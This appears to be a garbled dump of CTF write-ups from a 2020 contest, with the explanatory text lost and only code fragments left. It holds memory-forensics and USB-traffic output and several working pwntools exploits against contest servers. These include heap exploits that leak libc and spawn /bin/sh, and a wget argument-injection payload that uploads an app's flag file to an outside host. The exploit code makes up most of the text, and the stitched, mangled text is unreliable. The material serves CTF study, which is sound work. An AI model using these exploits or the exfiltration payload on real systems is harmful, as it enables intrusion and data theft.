i = 1025
# for 1024 bit n
while i passwd:weak_auth_top100               
????????????????????????????????                                               
zip
weak_auth_top100
C:\Documents and Settings\Administrator>start wireshark                       
?????????????? wireshark??                                                     
C:\Documents and Settings\Administrator>                                       
**************************************************
ConsoleProcess: csrss.exe Pid: 464
Console: 0x55ae98 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: ?U?UtemRoot%\system32\defrag.exe
Title: ?U??INDOWS\system32\defrag.exe
**************************************************
ConsoleProcess: csrss.exe Pid: 464
Console: 0x983e98 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: ?U?UtemRoot%\system32\defrag.exe
Title: ?U??INDOWS\system32\defrag.exe
----
CommandHistory: 0x55af9c Application: ?U?U2B> Flags: 
CommandCount: -20568 LastAdded: 85 LastDisplayed: 1
FirstCommand: 4 CommandCountMax: 50
ProcessHandle: 0x3e
# acdxvfsvd @ ubuntu in ~/gxzyctf2020 [6:36:22] 
$ volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep flag
Volatility Foundation Volatility Framework 2.6
0x0000000001155f90      1      0 R--rwd \Device\HarddiskVolume1\Documents and 
Settings\Administrator\flag.img
00:00:09:00:00:00:00:00
00:00:0F:00:00:00:00:00
00:00:04:00:00:00:00:00
00:00:0A:00:00:00:00:00
00:00:2F:00:00:00:00:00
00:00:23:00:00:00:00:00
00:00:26:00:00:00:00:00
00:00:1F:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:25:00:00:00:00:00
usb
TOGETYOURFLAG
zipwav
....
MP3Stego...
187485618521
00:00:20:00:00:00:00:00
00:00:22:00:00:00:00:00
00:00:24:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:08:00:00:00:00:00
00:00:06:00:00:00:00:00
00:00:20:00:00:00:00:00
00:00:08:00:00:00:00:00
00:00:07:00:00:00:00:00
00:00:25:00:00:00:00:00
00:00:07:00:00:00:00:00
00:00:1F:00:00:00:00:00
00:00:04:00:00:00:00:00
00:00:23:00:00:00:00:00
00:00:21:00:00:00:00:00
00:00:08:00:00:00:00:00
00:00:24:00:00:00:00:00
00:00:20:00:00:00:00:00
00:00:09:00:00:00:00:00
00:00:08:00:00:00:00:00
00:00:26:00:00:00:00:00
00:00:1E:00:00:00:00:00
00:00:20:00:00:00:00:00
00:00:06:00:00:00:00:00
00:00:27:00:00:00:00:00
00:00:30:00:00:00:00:00
USEBASE64 
MTg3NDg1NjE4NTIx
USEBASE64
base64
gmon.out0x401XXXvmp
strcmp0ﬂag
x64dbgﬂag
MISC
Apk
GetFlag
HmacwgetUAGNU Wget
import hmac
from hashlib import sha1
from pwn import *
def hmacsha1(k,s):
    hashed = hmac.new(k, s, sha1)
    return hashed.hexdigest()
def send_p(s,k):
    message = {"message":s,"check":hmacsha1(k,s)}
    return str(message)
p = remote('212.64.66.177',8080)
# p = remote('127.0.0.1',8080)
k = int(p.recvline()[:-1])
Pwn
Shotest_Path_v2
# payload = "--body-file=/data/data/com.xuanxuan.getflag/files/flag 
66.42.44.232:23333"
payload = "66.42.44.232:23333 --body-
file=/data/data/com.xuanxuan.getflag/files/flag --method=HTTPMethod"
p.sendline(send_p(payload,str(k)))
p.interactive()
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import *
# flag{SPFA_1s_4_9o0d_A1gorithm}
context.arch= 'amd64'
r = lambda x: p.recvuntil(x,drop=True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y : p.sendlineafter(x,y)
HOST,PORT = '121.37.181.246',19008
p = remote(HOST,PORT)
# p = process('./Shortest_path')
e = ELF("./Shortest_path")
def alloc(idx,p,l,name,n,ids=[],dis=[]):
    sl('---> ',str(1))
    sl('ID: ',str(idx))
    sl('Price: ',str(p))
    sl('Length: ',str(l))
    sl('Name: \n',name)
    sl('station: ',str(n))
    for i in range(n):
        sl('ID: ',str(ids[i]))
        sl('distance: ',str(dis[i]))
def rem(idx):
    sl('---> ',str(2))
    sl('ID: ',str(idx))
def queryst(idx):
    sl('---> ',str(3))
    sl('ID: ',str(idx))
twochunk
def queryro(sid,tid):
    sl('---> ',str(4))
    sl('ID: ',str(sid))
    sl('ID: ',str(tid))
alloc(0,0,0x17,'\0'*0x17,0)
alloc(1,1,0x27,'\0'*0x17,0)
for i in range(0x2,0x11):
    alloc(i,i,0x17,'\0'*0x17,1,[i+1],[-1])
alloc(0x11,0x11,0x17,'\0'*0x17,1,[2],[-1])
rem(0)
rem(1)
queryro(0x2,0x11)
alloc(0x12,0x12,0x10,p64(0)+p64(0x6068E0),0)
queryst(0)
p.interactive()
    #!/usr/bin/env python3
    #-*- coding: utf-8 -*-
    from pwn import *
    # flag{Th1s_1s_the_flag_0f_tw0chunk}
    context.arch= 'amd64'
    r = lambda x: p.recvuntil(x,drop=True)
    s = lambda x,y: p.sendafter(x,y)
    sl = lambda x,y : p.sendlineafter(x,y)
    # p = process('./twochunk')
    HOST,PORT = '121.36.209.145',9999
    p = remote(HOST,PORT)
    l = ELF('/lib/x86_64-linux-gnu/libc-2.30.so')
    e = ELF("./twochunk")
    s('name: ',p64(0x23333020)*6)
    s('message: ',p64(0x23333020)*8)
    def add(idx,sz):
        s('choice: ',str(1))
        s('idx: ',str(idx))
        s('size: ',str(sz))
    def free(idx):
        s('choice: ',str(2))
        s('idx: ',str(idx))
    def show(idx):
        s('choice: ',str(3))
        s('idx: ',str(idx))
    def edit(idx,cnt):
        s('choice: ',str(4))
        s('idx: ',str(idx))
        s('content: ',cnt)
    def sshow():
        s('choice: ',str(5))
    def leave(msg):
        s('choice: ',str(6))
        s('message: ',msg)
    def bback():
        s('choice: ',str(7))
    # leaking libc
    # add(0,0x228)
    # for i in range(0x7):
    #     add(1,0x228)
    #     free(1)
    # free(0)
    # add(1,23333)
    # show(1)
    # l.address = u64(p.recv(8))-0x1eaf00
    # log.info('l.address:'+hex(l.address))
    for i in range(5):
        add(0,0x88)
        free(0)
    # construce smallbins chain
    add(0,0x128)
    for i in range(0x7):
        add(1,0x128)
        free(1)
    free(0)
    add(1,0x98)
    free(1)
    add(0,0xe9)
musl
    add(1,0xe9)
    free(0)
    free(1)
    add(0,0x138)
    for i in range(0x7):
        add(1,0x138)
        free(1)
    free(0)
    add(1,0xa8)
    free(1)
    # leaking heap
    add(1,23333)
    show(1)
    heap = u64(p.recv(8))-0xef0
    log.info('heap:'+hex(heap))
    add(0,0x200)
    free(0)
    # tcache_put
    payload = 0x108*'\x00'
    payload += p64(0xb1)
    payload += '\x00'*0x98+p64(0x91)
    payload += p64(heap+0x600)+p64(0x23332ff0)
    edit(1,payload)
    add(0,0x88)
    # leaking libc
    sshow()
    r('message: ')
    l.address = u64(p.recvuntil('\n',drop=True).ljust(0x8,'\0'))-0x1eac60
    log.info('l.address:'+hex(l.address))
    system = l.symbols['system']
    log.info('system:'+hex(system))
    leave(p64(system)+'/bin/sh\x00'+4*p64(0)+p64(0x23333008)+0x48*'\0')
    # getshell
    bback()
    p.interactive()
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import *
# flag{It_1s_n0t_0ur_3nemi3s_that_def3at_us_It_1s_0ur_f3ar_POE}
context.arch= 'amd64'
r = lambda x: p.recvuntil(x,drop=True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y : p.sendlineafter(x,y)
# p = process('./carbon')
HOST,PORT = '119.3.158.103',19008
p = remote(HOST,PORT)
e = ELF("./carbon")
def add(sz,cnt,bel='N'):
    sl('> ',str(1))
    sl('>',str(sz))
    sl('>',bel)
    s('>',cnt)
def dele(idx):
    sl('> ',str(2))
    sl('>',str(idx))
def edit(idx,cnt):
    sl('> ',str(3))
    sl('>',str(idx))
    p.send(cnt)
def show(idx):
    sl('> ',str(4))
    sl('>',str(idx))
# leaking libc
add(0x68,'0'*0x68)
add(0x68,'1'*0x68)
add(0x68,'2'*0x68)
add(0x68,'3'*0x68)
add(0x68,'4'*0x68)
dele(0)
add(0x8,'0'*0x8)
show(0)
r('0'*0x8)
libc = u64(r('Done').ljust(0x8,b'\0'))-0x292b08
log.info('libc:'+hex(libc))
mmap = libc+0x290000
log.info('mmap:'+hex(mmap))
environ = libc+0x294fd8
log.info('environ:'+hex(environ))
lgd
oﬀ by one + seccomp ban execveadd rsp,0x48;ret;orw
# dele(1)
dele(2)
# unlink
payload = p64(0x91)+p64(0x70)
payload += p64(mmap+0x28-0x18)+p64(mmap+0x28-0x10)
payload += b'\x00'*0x50
payload += p64(0x70)+p64(0x81)
add(0x68,payload+b'\n','Y')
dele(3)
edit(2,p32(0x602034)+b'\x00\x00\x00\n')
edit(1,p32(0x0)+b'\n')
#leaking stack
edit(2,p64(environ)[0:6]+b'\n')
show(1)
stack = u64(r('Done').ljust(0x8,b'\0'))
log.info('stack:'+hex(stack))
edit(2,p64(stack-0x70)[0:6]+b'\n')
# z()
edit(1,p64(libc+0x390D1)[0:6]+b'\n')
p.interactive()
from pwn import *
#r = process('./lgd')
r = remote('121.36.209.145',9998)
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
def add(size,content):
r.recvuntil(">> ")
r.sendline("1")
r.recvuntil("______?")
r.sendline(str(size))
r.recvuntil("start_the_game,yes_or_no?")